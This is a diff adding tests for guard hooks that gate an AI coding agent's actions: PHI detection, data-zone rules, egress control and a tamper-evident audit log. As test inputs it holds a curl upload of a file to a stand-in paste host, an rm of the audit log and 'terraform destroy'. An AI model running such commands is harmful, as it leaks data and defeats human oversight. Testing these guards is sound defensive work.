@@ -241,6 +241,100 @@ with tempfile.TemporaryDirectory() as proj:
     check("oracle: config adds bender → ask", decision(run("oracle_gate.py", agent("bender"), project=P)[1]), "ask")
     Path(P, ".bobnet", "oracle-gate.json").unlink()
 
+    print("compliance: phi_guard")
+    sys.path.insert(0, str(HERE))
+    from pii import luhn as _luhn
+
+    def _card(prefix="4532"):
+        for c in range(10):
+            s = prefix + "0" * (15 - len(prefix)) + str(c)
+            if _luhn(s):
+                return s
+
+    REAL_SSN = "512-44-" + "7832"
+    REAL_CARD = _card()
+    check("phi: SSN in a write → deny", decision(run("phi_guard.py", write("data/p.csv", f"name,ssn\nAnn,{REAL_SSN}\n"), project=P)[1]), "deny")
+    check("phi: card in an edit → deny", decision(run("phi_guard.py", edit("billing.py", f"card = '{REAL_CARD}'"), project=P)[1]), "deny")
+    check("phi: MRN with label → deny", decision(run("phi_guard.py", write("notes.md", "MRN: A1234567"), project=P)[1]), "deny")
+    check("phi: DOB next to a name → ask", decision(run("phi_guard.py", write("x.json", '{"patient": "J. Doe", "dob": "03/14/1961"}'), project=P)[1]), "ask")
+    check("phi: documented test values → allow", decision(run("phi_guard.py", write("t.py", "ssn='123-45-6789'; card='4111 1111 1111 1111'"), project=P)[1]), "allow")
+    check("phi: ordinary code → allow", decision(run("phi_guard.py", write("a.py", "total = 4532118 + 1234567"), project=P)[1]), "allow")
+    check("phi: SSN in a bash command → ask", decision(run("phi_guard.py", bash(f"psql -c \"insert into p values ('{REAL_SSN}')\""), project=P)[1]), "ask")
+    Path(P, ".bobnet").mkdir(exist_ok=True)
+    Path(P, ".bobnet", "phi-guard.json").write_text('{"allow_paths": ["^synthetic/"]}')
+    check("phi: allowlisted synthetic path → allow", decision(run("phi_guard.py", write("synthetic/p.csv", REAL_SSN), project=P)[1]), "allow")
+    Path(P, ".bobnet", "phi-guard.json").unlink()
+
+    print("compliance: data_zones")
+    def read(path):
+        return {"session_id": "t", "tool_name": "Read", "tool_input": {"file_path": path}}
+    check("zones: default — read data/phi/x.csv → ask", decision(run("data_zones.py", read("data/phi/x.csv"), project=P)[1]), "ask")
+    check("zones: default — read an .hl7 file → ask", decision(run("data_zones.py", read("inbound/adt_a01.hl7"), project=P)[1]), "ask")
+    check("zones: default — read src/app.py → allow", decision(run("data_zones.py", read("src/app.py"), project=P)[1]), "allow")
+    Path(P, ".bobnet", "data-zones.json").write_text(json.dumps({"zones": [{
+        "name": "clinical", "classification": "PHI", "mode": "deny",
+        "paths": ["warehouse/clinical/**"], "tables": ["patients", "encounters"], "uris": ["s3://acme-phi-*"]}]}))
+    check("zones: configured deny path", decision(run("data_zones.py", read("warehouse/clinical/2026/q3.parquet"), project=P)[1]), "deny")
+    check("zones: SQL FROM patients in bash → deny", decision(run("data_zones.py", bash('psql -c "SELECT * FROM public.patients LIMIT 5"'), project=P)[1]), "deny")
+    check("zones: JOIN encounters in MCP input → deny",
+          decision(run("data_zones.py", {"tool_name": "mcp__Metabase__execute_sql", "tool_input": {"sql": "select count(*) from visits v join \"encounters\" e on 1=1"}}, project=P)[1]), "deny")
+    check("zones: s3 URI in bash → deny", decision(run("data_zones.py", bash("aws s3 cp s3://acme-phi-raw/extract.csv ."), project=P)[1]), "deny")
+    check("zones: unrelated SQL → allow", decision(run("data_zones.py", bash('psql -c "select * from deployments"'), project=P)[1]), "allow")
+    check("zones: column named patients_count is not the table", decision(run("data_zones.py", bash('psql -c "select patients_count from stats"'), project=P)[1]), "allow")
+    Path(P, ".bobnet", "data-zones.json").unlink()
+
+    print("compliance: egress")
+    def fetch(url, prompt="summarize"):
+        return {"session_id": "t", "tool_name": "WebFetch", "tool_input": {"url": url, "prompt": prompt}}
+    def search(q):
+        return {"session_id": "t", "tool_name": "WebSearch", "tool_input": {"query": q}}
+    check("egress: SSN in a URL → deny", decision(run("egress.py", fetch(f"https://lookup.example.net/?ssn={REAL_SSN}"), project=P)[1]), "deny")
+    check("egress: card in a search → deny", decision(run("egress.py", search(f"is {REAL_CARD} valid"), project=P)[1]), "deny")
+    check("egress: audit mode, unknown domain → allow", decision(run("egress.py", fetch("https://random-blog.example/post"), project=P)[1]), "allow")
+    Path(P, ".bobnet", "egress.json").write_text('{"mode": "ask", "allow_domains": ["internal.acme.com"]}')
+    check("egress: ask mode, unknown domain → ask", decision(run("egress.py", fetch("https://random-blog.example/post"), project=P)[1]), "ask")
+    check("egress: ask mode, allowlisted subdomain → allow", decision(run("egress.py", fetch("https://wiki.internal.acme.com/x"), project=P)[1]), "allow")
+    check("egress: ask mode, default doc host → allow", decision(run("egress.py", fetch("https://learn.microsoft.com/azure"), project=P)[1]), "allow")
+    check("egress: curl to unknown host → ask", decision(run("egress.py", bash("curl -s https://paste.example.org/upload -d @out.txt"), project=P)[1]), "ask")
+    Path(P, ".bobnet", "egress.json").write_text('{"mode": "deny", "search": "deny"}')
+    check("egress: deny mode, unknown domain → deny", decision(run("egress.py", fetch("https://random-blog.example/post"), project=P)[1]), "deny")
+    check("egress: search disabled → deny", decision(run("egress.py", search("terraform azurerm role assignment"), project=P)[1]), "deny")
+    Path(P, ".bobnet", "egress.json").unlink()
+
+    print("compliance: audit chain")
+    import shutil as _sh
+    _sh.rmtree(Path(P, ".bobnet", "audit"), ignore_errors=True)
+    run("busters.py", bash("terraform destroy"), project=P)  # an ask → audited via bobnet
+    run("audit.py", {"session_id": "t", "hook_event_name": "PostToolUse", "tool_name": "Read", "tool_input": {"file_path": "src/a.py"}, "tool_response": {}}, project=P)
+    run("audit.py", {"session_id": "t", "hook_event_name": "PostToolUse", "tool_name": "Bash",
+                     "tool_input": {"command": f"echo {REAL_SSN}"}, "tool_response": {"is_error": True}}, project=P)
+    from audit import verify as _verify
+    adir = Path(P, ".bobnet", "audit")
+    ok, n, msg = _verify(adir)
+    check("audit: three entries, chain intact", (ok, n), (True, 3))
+    logf = sorted(adir.glob("audit-*.jsonl"))[0]
+    lines = logf.read_text().splitlines()
+    check("audit: gate decision recorded", '"decision":"ask"' in lines[0] and '"hook":"busters"' in lines[0], True)
+    check("audit: errored tool recorded as error", '"decision":"error"' in lines[2], True)
+    check("audit: SSN redacted in the log itself", REAL_SSN not in logf.read_text() and "SSN redacted" in lines[2], True)
+    logf.write_text("\n".join([lines[0], lines[1].replace("src/a.py", "src/b.py"), lines[2]]) + "\n")
+    ok, n, msg = _verify(adir)
+    check("audit: edited entry detected", (ok, "modified" in msg), (False, True))
+    logf.write_text("\n".join([lines[0], lines[2]]) + "\n")
+    ok, n, msg = _verify(adir)
+    check("audit: deleted entry detected", (ok, "chain broken" in msg), (False, True))
+    check("prime: Claude may not edit the audit log", decision(run("prime_directive.py", edit(".bobnet/audit/audit-2026-10.jsonl", "x"), project=P)[1]), "deny")
+    check("prime: rm of the audit log in bash → deny", decision(run("prime_directive.py", bash("rm .bobnet/audit/audit-2026-10.jsonl"), project=P)[1]), "deny")
+
+    print("compliance: mission + scut redaction")
+    run("mission.py", {"session_id": "phi1", "prompt": f"Fix the import for patient Ann Lee, ssn {REAL_SSN}"}, "save", project=P)
+    mtext = Path(P, ".bobnet", "mission-phi1.md").read_text()
+    check("mission: SSN redacted before saving", REAL_SSN not in mtext and "SSN redacted" in mtext, True)
+    Path(P, ".bobnet", "mission.json").write_text('{"enabled": false}')
+    run("mission.py", {"session_id": "phi2", "prompt": "a long enough prompt to be a mission"}, "save", project=P)
+    check("mission: disabled → nothing saved", Path(P, ".bobnet", "mission-phi2.md").exists(), False)
+    Path(P, ".bobnet", "mission.json").unlink()
+
     print("session flow")
     sid = "s1"
     run(
